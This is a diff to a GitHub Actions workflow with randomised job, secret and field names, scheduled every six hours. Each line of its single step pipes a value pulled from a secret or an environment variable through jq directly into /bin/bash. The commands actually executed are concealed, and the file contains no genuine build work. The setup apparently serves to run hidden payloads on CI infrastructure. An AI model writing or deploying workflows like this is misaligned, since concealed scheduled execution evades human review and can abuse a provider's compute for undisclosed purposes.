@@ -1,21 +1,23 @@
 name: xucijiu3176
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 3/6 * * *'
-jobs:  # 16586
+    - cron: '34 5/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: xucijiu3176
         env:
-          bm87902: ${{ secrets.bm87902 }}
+          or793: ${{ secrets.or793 }}
         run: |
-          echo $bm87902 | jq -r .kwe5552 | /bin/bash
-          echo $aufg3 | jq -r .ftxcc28 | /bin/bash
-          echo $vtb69668 | jq -r .ot256 | /bin/bash
-          echo $lb047 | jq -r .jvlfm2 | /bin/bash
-          echo $psq55419 | jq -r .renev94 | /bin/bash
-          echo $nuzz744 | jq -r .fih9 | /bin/bash
+          echo $or793 | jq -r .dyx46 | /bin/bash
+          echo $cky331 | jq -r .cj2 | /bin/bash
+          echo $yu1878 | jq -r .jahd1 | /bin/bash
+          echo $iwwvx22 | jq -r .pmn47531 | /bin/bash
+          echo $ytpqx8441 | jq -r .wncrq66 | /bin/bash
 
